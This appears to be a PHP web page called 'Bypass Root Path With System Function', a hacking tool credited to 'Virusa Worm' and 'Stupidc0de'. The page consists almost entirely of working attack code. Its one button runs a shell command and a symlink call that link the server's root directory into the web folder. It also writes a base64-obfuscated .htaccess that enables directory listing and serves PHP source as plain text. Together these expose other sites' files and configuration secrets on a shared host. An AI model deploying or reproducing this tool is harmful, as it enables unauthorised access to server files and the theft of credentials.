<html>
<!--
Bypass Bypass Root Path With System Function By Virusa Worm | Made By Virusa Worm
Re-Style By Stupidc0de
-->
<head>
	<title>Bypass Root Path With System Function</title>
</head>

<link rel="shortcut icon" href="http://lh3.googleusercontent.com/AAmKzxieIvw2DdVubqRX3JehWlnKCZcii_oMf_XurordSzPnFha9BHU38fAnkHWC6xHMkJj0l9xFzTVavxD8rMi8cSmmmaWZnb5bcaLD3fxhjVH-BMKnOPE2JHyjrmKePfe1DcCEjGP4QCU_t42YWsvV6AlFYkQODJOrCusPcgkuRksFswaM5IiqUeSBaMoJnTRJOHdHY5WiaPy1BtvMCabvrk2aL4sJq6GfShizqJk1di6jAWPTFus-avGGiMc8-A_8Gpy1iUxFaieFlLideuT_VZrtf5CaKUjVfEZSXbFDELAOzeS6U190fuJ9kBzN0sKXCNeSPZRR4xahMQHiEtWBDAiuC9WCVcJQznUlkbFXsQ5XhcHlrXPqAVSVSNqgSOhjTJI84DnFFKagSXPhkrAOIQB9kp3METO1uFEw-xRDUQLEBfcnOyNNioeTgMyr0qgmdsOSGJvd9gr4xRddTZJcwIVkf2wo-oesm5Zkv6WlQbn65fvFvY19fW6I3beXwuUwf5JlYt8xm0qng2P_XNZTtqhDIzYYeDLl4oPKRS1fx5QMQxuGsRHLenngPNMcxuFKkd-WYa3Tk1SKQTPl-RCiNVbD4A=w589-h667-no" type="image/x-icon" />
<link href="https://fonts.googleapis.com/css?family=Homenaje" rel="stylesheet" type="text/css">
<style type="text/css">
body { background-color: transparent;
	   text-align: center; 
	 }
a:link {
		  text-decoration:none;
 		  color:#009900;
	   } 
.bordergaya{
	background:black;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:16px;
	border:2px solid #2d2b2b;	
}
.bordergaya:hover{
	background:#2d2b2b;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:16px;
	border:2px solid crimson;
}
</style>

<body bgColor="000000">
	<br/><br/>
	<tr>
		<td>
			<?php
			 echo "<form method='POST' action=''>" ;
			 echo "<center><input class='bordergaya' type='submit' value='Bypass Bro!' name='go'></center>";
			  if (isset($_POST['go'])){ 
			  	system('ln -s / stupid_sf.txt'); 
			  	$htaccess ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
			  	$file = fopen(".htaccess","w+"); 
			  	$write = fwrite ($file ,base64_decode($htaccess)); 
			  	$stupid_sf = symlink("/","stupid_sf.txt"); 
			  	$rt="<br><a href=stupid_sf.txt TARGET='_blank'><font color='crimson' size='4' face='Homenaje'><b>Klik Here!</b></font></a>"; 
			  	echo "<br><b><font color='springgreen' size='3' face='Homenaje'>Sukses ~_^</font></b><br>$rt</center>";} 
			 echo "</form>"; 
			?>
		</td>
	</tr>
</body>
</html>